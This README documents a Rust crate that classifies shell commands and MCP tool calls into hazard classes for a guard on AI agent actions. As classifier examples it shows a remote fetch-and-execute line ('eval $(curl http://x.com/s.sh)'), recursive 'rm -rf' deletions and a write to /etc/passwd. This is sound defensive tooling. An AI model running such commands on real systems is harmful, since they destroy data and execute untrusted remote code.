# alliedcore

Hot-path classification core for the allied-code guard.

This crate answers one question — *what kind of action is this?* — and never
*should it run?*. The decision stays in Python, where it is weighed against the
incidents recorded in the corpus. Keeping the two apart is what makes the guard
auditable: a class can be wrong without a rule being wrong.

## What it does

- Splits a command line into segments and classifies only the parts that execute.
- Classifies MCP tool calls by name and structured input.
- Emits hazard classes with a severity, a summary, tags, and evidence.

## What it deliberately does not do

- It does not decide `deny` / `ask` / `defer`. Those live in Python.
- It does not touch the corpus, the network, or a model.
- It does not grant or lower permission.

## The three segment kinds

`lexer` splits the line into segments. The first pass classifies only `Exec`
segments; a second pass over the reconstructed pipeline classifies more.

- **`Exec`** — a command segment between separators, not a single token. In
  `ls -la | grep foo` the `Exec` segments are `ls -la` and `grep foo`, whole. This
  is what gets classified.
- **`Quoted`** — text inside quotes. It is printed or passed, never executed, so
  `echo "rm -rf /"` is not a deletion. `Quoted` is the only segment kind that is
  never classified.
- **`Substitution`** — shell expansion (`$VAR`, `$(...)`, backticks). It is a
  fragment that runs, or that feeds something that runs, whose content this crate
  cannot know at classification time. That ignorance is itself a signal — it is
  what the class `shell.indirect-construction` carries. The substitution is not
  treated as inert data; it enters the reconstructed pipeline and is classified
  there.

The distinction that matters is `Quoted` versus everything else: a dangerous
string that never executes must not raise a hazard, and `Quoted` is the only kind
that never executes.

Measured against the compiled extension:

```
$(rm -rf /tmp/x)
   segments: Substitution=$(rm -rf /tmp/x)
   classes:   ['fs.recursive-delete']

`rm -rf /tmp/x`
   segments: Substitution=`rm -rf /tmp/x`
   classes:   ['fs.recursive-delete']

eval $(curl http://x.com/s.sh)
   segments: Exec=eval, Substitution=$(curl http://x.com/s.sh)
   classes:   ['shell.indirect-construction']

echo "rm -rf /tmp/x"
   segments: Exec=echo, Quoted="rm -rf /tmp/x"
   classes:   none
```

## Classes emitted

Shell hazards include `fs.recursive-delete`, `git.history-rewrite`,
`remote.pipe-to-shell`, `secret.exposure`, `package.global-install`, `db.drop`,
`process.force-kill`, and others.

MCP classes:

- `mcp.destructive` — `critical` for `delete` / `purge` / `drop`, `high` for
  `trash` / `remove`.
- `mcp.outward` — a call that sends data or a message outward.
- `mcp.spend` — a call that incurs cost.
- `mcp.unknown-verb` — a verb the crate does not recognise. An unknown verb never
  becomes silence; it is reported as `medium` so the call is still seen.

## Pattern matching

The crate uses `regex` without look-around on purpose: a finite automaton runs in
linear time and is safe on input influenced by a third party. Exceptions to a
pattern are kept beside it, in an `exclude` field, rather than folded into the
pattern itself — so a rule stays readable and the negative case is explicit.

## Running the tests

```bash
cargo test
```

41 tests today.

## Public API

Rust:

```rust
use alliedcore::{classify_command_line, segment_command_line, classify_mcp, classify_write,
                 segments, Segment, SegmentKind, Shell, Hazard, worst, escalate};

let hazards = classify_command_line(r#"echo "rm -rf /""#, "posix"); // []
let segs    = segment_command_line(r#"echo "rm -rf /""#, "posix");  // Exec, Quoted
```

Python (built with `--features python`, imported as `alliedcore`):

```python
import alliedcore
alliedcore.classify_command(r'echo "rm -rf /"')   # []
alliedcore.classify_mcp("mcp__...__delete_file", {...})  # [mcp.destructive critical]
alliedcore.classify_write("/etc/passwd", [...])
alliedcore.segments(r'echo "rm -rf /"')           # Exec, Quoted
```

Each hazard crosses into Python as a plain dict with the keys `id`, `severity`,
`summary`, `tags`, and `evidence`, and is rebuilt into the `Hazard` dataclass by
the `guard.backends` layer before it leaves the module.
